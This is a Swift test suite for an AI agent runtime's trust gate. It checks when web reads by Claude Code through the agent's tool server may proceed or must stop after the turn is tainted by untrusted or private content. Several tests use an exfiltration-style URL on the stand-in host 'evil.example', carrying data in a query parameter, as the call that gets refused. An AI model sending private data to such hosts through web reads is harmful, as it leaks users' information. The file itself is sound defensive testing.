// Tests for jv-webabort: with Core 2's face in use, a web read the trust gate already decided must not end the
// conversation at its result because the old path's read judge (I3) was never asked. The driver's web-result check takes
// the trust gate's own decision for exactly that call (ArisFaceDecisions, noted by POST /mind-call under Claude Code's
// tool-use id) in place of the judge's yes; with none it stops as before, and nothing changes without the face.
// The pure parts are also tested with `swift test` (Tests/ArisCoreTests/ArisFaceDecisionsTests.swift). Called from
// main.swift; uses its check().
import Foundation

func runWebAbortTests() {
    let saved = ArisCore2.isOn
    defer { ArisCore2.isOn = saved }
    ArisCore2.isOn = { true }
    webabortReproTests()
    webabortRefusedTests()
    webabortJobTests()
    webabortOtherRowsTests()
    webabortStoreTests()
    webabortRouteTests()
    webabortShimTests()
    webabortWiringTests()
    ArisCore2.isOn = { false }
    webabortFaceOffTests()
}

private let abortTools = "/opt/aris-tools-webabort/aris-tools"

private func abortLine(_ object: [String: Any]) -> String {
    String(decoding: try! JSONSerialization.data(withJSONObject: object, options: [.sortedKeys]), as: UTF8.self)
}

private func faceUse(_ id: String, _ function: String, _ input: [String: Any]) -> String {
    abortLine(["type": "assistant", "message": ["content": [["type": "tool_use", "id": id, "name": "mcp__aris__" + function, "input": input]]]])
}

private func builtInUse(_ id: String, _ name: String, _ input: [String: Any]) -> String {
    abortLine(["type": "assistant", "message": ["content": [["type": "tool_use", "id": id, "name": name, "input": input]]]])
}

private func faceResult(_ id: String, error: Bool = false) -> String {
    abortLine(["type": "user", "message": ["content": [["type": "tool_result", "tool_use_id": id, "content": "page", "is_error": error]]]])
}

private func webStops(_ events: [ArisBrainEvent]) -> Bool { events.contains(.abort(ArisClaudeDriver.uncheckedWebStop)) }
private func anyAbort(_ events: [ArisBrainEvent]) -> Bool { events.contains { if case .abort = $0 { return true }; return false } }

/// The open Claude with the face (Core 2 on), past its init line and into a turn, its web-result check reading `decisions`
/// as the runner wires it.
private func faceDriver(task: Bool = false, decisions: ArisFaceDecisions? = nil) -> ArisClaudeDriver? {
    let driver = ArisClaudeDriver(model: "sonnet", tools: abortTools, task: task)
    guard driver.hands != nil else { return nil }
    if let decisions { driver.faceAllowed = { decisions.take(id: $0, function: $1, arguments: $2) } }
    _ = driver.read(abortLine(["type": "system", "subtype": "init", "tools": ArisHandsFace.clientNames,
                               "mcp_servers": [["name": "aris", "status": "connected"]]]))
    _ = driver.ask("x", tier: .quick)
    return driver
}

// MARK: - The reproduction: a marked turn, a face web call the trust gate allowed, its result

private func webabortReproTests() {
    let decisions = ArisFaceDecisions()
    decisions.begin(turn: "turn-1")
    guard let driver = faceDriver(decisions: decisions) else { return check(false, "webabort repro: the open Claude has the face with Core 2 on") }
    // A result with content marked the turn (POST /mind-call done → mcpTakeOutsideText).
    driver.markUntrusted()
    // The trust gate let it run (POST /mind-call decide → noteRun), then Claude reads its result.
    decisions.ran(turn: "turn-1", id: "w1", function: "web_fetch", arguments: ["url": "https://example.com/a"])
    _ = driver.read(faceUse("w1", "web_fetch", ["url": "https://example.com/a"]))
    check(!webStops(driver.read(faceResult("w1"))), "webabort repro: a marked Core 2 turn's web_fetch the trust gate let run is not stopped at its result")
    decisions.ran(turn: "turn-1", id: "w2", function: "web_search", arguments: ["query": "파이썬 강좌"])
    _ = driver.read(faceUse("w2", "web_search", ["query": "파이썬 강좌"]))
    check(!webStops(driver.read(faceResult("w2"))), "webabort repro: so is its web_search")
    check(driver.taint == .outsideText && driver.turnMarked, "webabort repro: the taint marking stays")
}

// MARK: - Without the trust gate's decision for exactly that call, it still stops

private func webabortRefusedTests() {
    let decisions = ArisFaceDecisions()
    decisions.begin(turn: "turn-1")
    guard let driver = faceDriver(decisions: decisions) else { return check(false, "webabort refused: the face") }
    driver.markUntrusted()
    _ = driver.read(faceUse("n1", "web_fetch", ["url": "https://example.com/a"]))
    check(webStops(driver.read(faceResult("n1"))), "webabort refused: a web result with no trust decision for it still stops the process")
    decisions.ran(turn: "turn-1", id: "n2", function: "web_fetch", arguments: ["url": "https://example.com/a"])
    _ = driver.read(faceUse("n2", "web_fetch", ["url": "https://evil.example/c?d=x"]))
    check(webStops(driver.read(faceResult("n2"))), "webabort refused: a decision for other arguments doesn't count")
    decisions.ran(turn: "turn-1", id: "n3", function: "web_search", arguments: ["url": "https://example.com/a"])
    _ = driver.read(faceUse("n3", "web_fetch", ["url": "https://example.com/a"]))
    check(webStops(driver.read(faceResult("n3"))), "webabort refused: a decision for another function doesn't count")
    decisions.ran(turn: "turn-1", id: "other", function: "web_fetch", arguments: ["url": "https://example.com/b"])
    _ = driver.read(faceUse("n4", "web_fetch", ["url": "https://example.com/b"]))
    check(webStops(driver.read(faceResult("n4"))), "webabort refused: a decision for another call id doesn't count")
    decisions.ran(turn: "turn-1", id: "n5", function: "web_fetch", arguments: ["url": "https://example.com/c"])
    decisions.begin(turn: "turn-2")
    _ = driver.read(faceUse("n5", "web_fetch", ["url": "https://example.com/c"]))
    check(webStops(driver.read(faceResult("n5"))), "webabort refused: the turn before's decision is gone with it")
    decisions.ran(turn: "turn-1", id: "n6", function: "web_fetch", arguments: ["url": "https://example.com/d"])
    _ = driver.read(faceUse("n6", "web_fetch", ["url": "https://example.com/d"]))
    check(webStops(driver.read(faceResult("n6"))), "webabort refused: a decision noted under an old turn's credential isn't kept")
    _ = driver.read(faceUse("n7", "web_fetch", ["url": "https://example.com/e"]))
    check(!webStops(driver.read(faceResult("n7", error: true))), "webabort refused: a refused call (an error result) ran nothing, as before")
    // A decision is taken once: a second result under the same id finds none.
    decisions.ran(turn: "turn-2", id: "n8", function: "web_fetch", arguments: ["url": "https://example.com/f"])
    _ = driver.read(faceUse("n8", "web_fetch", ["url": "https://example.com/f"]))
    check(!webStops(driver.read(faceResult("n8"))), "webabort refused: the decided call passes")
    _ = driver.read(faceUse("n8", "web_fetch", ["url": "https://example.com/f"]))
    check(webStops(driver.read(faceResult("n8"))), "webabort refused: its decision isn't used twice")
    // A built-in web tool in a face process (none is given one) gets no help from the face's record.
    decisions.ran(turn: "turn-2", id: "b1", function: "", arguments: ["query": "x"])
    decisions.ran(turn: "turn-2", id: "b1", function: "WebSearch", arguments: ["query": "x"])
    _ = driver.read(builtInUse("b1", "WebSearch", ["query": "x"]))
    check(webStops(driver.read(faceResult("b1"))), "webabort refused: a built-in web call's result still needs the read judge's yes")
}

// MARK: - A background job's every web read (judged from its first) through the face

private func webabortJobTests() {
    let decisions = ArisFaceDecisions()
    decisions.begin(turn: "job-1")
    guard let job = faceDriver(task: true, decisions: decisions) else { return check(false, "webabort job: the face") }
    decisions.ran(turn: "job-1", id: "j1", function: "web_search", arguments: ["query": "x"])
    _ = job.read(faceUse("j1", "web_search", ["query": "x"]))
    check(!webStops(job.read(faceResult("j1"))), "webabort job: a job's first web_search the trust gate let run goes on")
    _ = job.read(faceUse("j2", "web_search", ["query": "y"]))
    check(webStops(job.read(faceResult("j2"))), "webabort job: one with no trust decision still stops it")
}

// MARK: - aris-tools' web rows through the face: never in the check (no read judge, no R5 for a face call)

private func webabortOtherRowsTests() {
    guard let driver = faceDriver() else { return check(false, "webabort rows: the face") }
    driver.markUntrusted()
    let fetch = driver.read(faceUse("a1", "aris", ["args": ["web", "fetch", "https://example.com/a"]]))
    let search = driver.read(faceUse("a2", "aris", ["args": ["web", "search", "파이썬"]]))
    check(!anyAbort(fetch) && !anyAbort(search) && !anyAbort(driver.read(faceResult("a1"))) && !anyAbort(driver.read(faceResult("a2"))),
          "webabort rows: an aris-tools web fetch or search through the face isn't stopped at its call or its result")
    let shell = driver.read(faceUse("a3", "shell_run", ["command": abortTools + " web fetch https://example.com/a"]))
    check(!anyAbort(shell) && !anyAbort(driver.read(faceResult("a3"))), "webabort rows: nor a shell line that runs it")
    check(driver.taint == .outsideText, "webabort rows: the taint marking stays")
}

// MARK: - The record of the turn's decisions

private func webabortStoreTests() {
    let store = ArisFaceDecisions()
    store.ran(turn: "", id: "x", function: "web_fetch", arguments: [:])
    check(!store.take(id: "x", function: "web_fetch", arguments: [:]), "webabort store: nothing is kept between turns")
    store.begin(turn: "t1")
    store.ran(turn: "t1", id: "toolu_01SWrVmaqHpy7uufBr3Twcne", function: "web_fetch", arguments: ["url": "https://a.io", "n": 1])
    check(store.take(id: "toolu_01SWrVmaqHpy7uufBr3Twcne", function: "web_fetch", arguments: ["n": 1, "url": "https://a.io"]),
          "webabort store: the same call, its keys in any order")
    store.ran(turn: "t1", id: "bad id", function: "web_fetch", arguments: [:])
    store.ran(turn: "t1", id: String(repeating: "a", count: ArisFaceDecisions.longestID + 1), function: "web_fetch", arguments: [:])
    check(!store.take(id: "bad id", function: "web_fetch", arguments: [:])
          && !store.take(id: String(repeating: "a", count: ArisFaceDecisions.longestID + 1), function: "web_fetch", arguments: [:]),
          "webabort store: an id that isn't one is never kept")
    for index in 0..<(ArisFaceDecisions.most + 5) { store.ran(turn: "t1", id: "c\(index)", function: "web_fetch", arguments: [:]) }
    check(store.take(id: "c0", function: "web_fetch", arguments: [:]) && !store.take(id: "c\(ArisFaceDecisions.most + 1)", function: "web_fetch", arguments: [:]),
          "webabort store: a turn keeps at most \(ArisFaceDecisions.most)")
    check(ArisMCPServerWire.toolUseId(Data(#"{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"ping","arguments":{},"_meta":{"claudecode/toolUseId":"toolu_01AB","progressToken":2}}}"#.utf8)) == "toolu_01AB"
          && ArisMCPServerWire.toolUseId(Data(#"{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"ping","arguments":{}}}"#.utf8)) == nil
          && ArisMCPServerWire.toolUseId(Data(#"{"jsonrpc":"2.0","id":2,"method":"tools/list","params":{"_meta":{"claudecode/toolUseId":"toolu_01AB"}}}"#.utf8)) == nil,
          "webabort store: Claude Code's tool-use id is read from a tools/call line's _meta, and only there")
}

// MARK: - POST /mind-call: the trust gate's run (or the owner's yes on its card) is noted; a refusal isn't

private func webabortRouteTests() {
    let folder = FileManager.default.temporaryDirectory.appendingPathComponent("aris-webabort-\(UUID().uuidString.prefix(8))")
    try? FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
    let home = URL(fileURLWithPath: folder.path).resolvingSymlinksInPath().path
    defer { try? FileManager.default.removeItem(atPath: home) }
    let gate = ArisTrustGate(home: home)
    let judge = ArisMindJudge(gate: gate, tools: abortTools, passes: ArisMindPasses())
    judge.cardWait = 2
    let s = "claude-webabort", turn = "cred-1"
    let decisions = ArisFaceDecisions()
    decisions.begin(turn: turn)
    judge.turn(session: s, intent: turn, words: "https://example.com/page 열어 줘")
    // Something private was read: from now on a web read runs only on the owner's words or their yes (ArisWebCarry).
    gate.toolResult(session: s, call: "r1", text: "thesis grade 91", source: ArisContentSource(kind: "file", source: home + "/notes.txt"))
    var cards = 0
    func decide(_ trustID: String, _ use: String, _ url: String, answer: Bool?) -> [String: Any] {
        let arguments: [String: Any] = ["url": url]
        let reply = ArisMindRoute.decide(judge: judge, session: s, task: nil, intent: turn, id: trustID, name: "web_fetch", arguments: arguments) { _, done in
            cards += 1
            done(answer)
        }
        ArisMindRoute.noteRun(reply, use: use, turn: turn, name: "web_fetch", arguments: arguments, into: decisions)
        return reply
    }
    let said = decide("k1", "toolu_said", "https://example.com/page", answer: false)
    check(said["verdict"] as? String == "run" && cards == 0 && decisions.take(id: "toolu_said", function: "web_fetch", arguments: ["url": "https://example.com/page"]),
          "webabort route: after a private read, the address the owner said runs with no card, and is noted for its result")
    let yes = decide("k2", "toolu_yes", "https://docs.python.org/3/tutorial/", answer: true)
    check(yes["verdict"] as? String == "run" && cards == 1 && decisions.take(id: "toolu_yes", function: "web_fetch", arguments: ["url": "https://docs.python.org/3/tutorial/"]),
          "webabort route: one the owner said yes to on the gate's card is noted")
    let no = decide("k3", "toolu_no", "https://evil.example/c?d=x", answer: false)
    check(no["verdict"] as? String == "refuse" && !decisions.take(id: "toolu_no", function: "web_fetch", arguments: ["url": "https://evil.example/c?d=x"]),
          "webabort route: one he said no to is refused and not noted")
    ArisMindRoute.noteRun(["verdict": "run"], use: nil, turn: turn, name: "web_fetch", arguments: [:], into: decisions)
    ArisMindRoute.noteRun(["verdict": "runWithUndo"], use: "toolu_undo", turn: turn, name: "write_file", arguments: ["path": "/tmp/x"], into: decisions)
    ArisMindRoute.noteRun(["verdict": "refuse"], use: "toolu_ref", turn: turn, name: "web_fetch", arguments: [:], into: decisions)
    check(decisions.take(id: "toolu_undo", function: "write_file", arguments: ["path": "/tmp/x"]) && !decisions.take(id: "toolu_ref", function: "web_fetch", arguments: [:]),
          "webabort route: run with undo is noted, a refusal never")
}

// MARK: - The face's server hands the helper Claude Code's id for the call

private func webabortShimTests() {
    let folder = FileManager.default.temporaryDirectory.appendingPathComponent("aris-webabort-shim-\(UUID().uuidString.prefix(8))")
    try? FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
    defer { try? FileManager.default.removeItem(at: folder) }
    try? Data("abc123".utf8).write(to: folder.appendingPathComponent("turn"))
    let environment = [ArisMCPTurnCredential.environmentKey: folder.appendingPathComponent("turn").path]
    let posted = ArisLocked<[[String: Any]]>([])
    // The helper refuses, so nothing is fetched.
    let remote = ArisMindRemote(environment: environment) { body, _ in
        posted.withLock { $0.append(body) }
        return ["verdict": "refuse", "text": "no"]
    }
    let wrote = DispatchSemaphore(value: 0)
    let server = ArisHandsServer(tools: abortTools, environment: environment, write: { _ in wrote.signal() }, judge: { _ in .ok },
                                 run: { _, _, _, _, _, _ in .printed("") }, local: { _, _ in nil }, mayRun: { true }, trust: remote)
    server.receive(Data(#"{"jsonrpc":"2.0","id":7,"method":"tools/call","params":{"name":"web_fetch","arguments":{"url":"https://example.com/a"},"_meta":{"claudecode/toolUseId":"toolu_01XY"}}}"#.utf8))
    let answered = wrote.wait(timeout: .now() + 10) == .success
    let decide = posted.withLock { $0 }.first { $0["op"] as? String == "decide" }
    check(answered && decide?["use"] as? String == "toolu_01XY" && decide?["name"] as? String == "web_fetch",
          "webabort shim: the decide call carries Claude Code's tool-use id for the call")
    server.receive(Data(#"{"jsonrpc":"2.0","id":8,"method":"tools/call","params":{"name":"web_fetch","arguments":{"url":"https://example.com/b"}}}"#.utf8))
    _ = wrote.wait(timeout: .now() + 10)
    let plain = posted.withLock { $0 }.last { $0["op"] as? String == "decide" }
    check(plain?["arguments"].flatMap { ($0 as? [String: Any])?["url"] as? String } == "https://example.com/b" && plain?["use"] == nil,
          "webabort shim: a call with no id carries none (its web result then finds no decision)")
}

// MARK: - The live halves the tests can't run (the runner and the route's door need a live turn)

private func webabortWiringTests() {
    let root = URL(fileURLWithPath: #filePath).deletingLastPathComponent().appendingPathComponent("..").standardized.path
    let source = { (file: String) in (try? String(contentsOfFile: root + "/" + file, encoding: .utf8)) ?? "" }
    let route = source("ArisAgent/Mind/ArisMindRoute+Live.swift"), runner = source("ArisAgent/ArisAgentRunner.swift")
    check(route.contains("if !mind { noteRun(answer, use: object[\"use\"], turn: credential, name: name, arguments: arguments, into: runner.faceDecisions) }")
          && route.range(of: "noteRun(answer")!.lowerBound < route.range(of: "reply(\"200 OK\", ArisMCPRoutes.json(answer))")!.lowerBound,
          "webabort wiring: the route notes the decision before it replies (so before the call runs)")
    check(runner.contains("faceDecisions.begin(turn: fresh)") && runner.contains("self?.faceDecisions.take(id: id, function: function, arguments: arguments) == true"),
          "webabort wiring: the runner starts each turn's record with its credential and hands it to the driver's check")
}

// MARK: - Without the face nothing changed

private func webabortFaceOffTests() {
    let off = ArisClaudeDriver(model: "sonnet", tools: abortTools)
    check(off.hands == nil, "webabort off: no face with Core 2 off")
    off.faceAllowed = { _, _, _ in true }
    _ = off.read(abortLine(["type": "system", "subtype": "init", "tools": ["Bash", "Read", "WebFetch", "WebSearch"], "mcp_servers": []]))
    _ = off.ask("x", tier: .quick)
    off.markUntrusted()
    _ = off.read(builtInUse("o1", "WebSearch", ["query": "x"]))
    check(webStops(off.read(faceResult("o1"))), "webabort off: after a read, a web result without the judge's yes still stops the process")
}
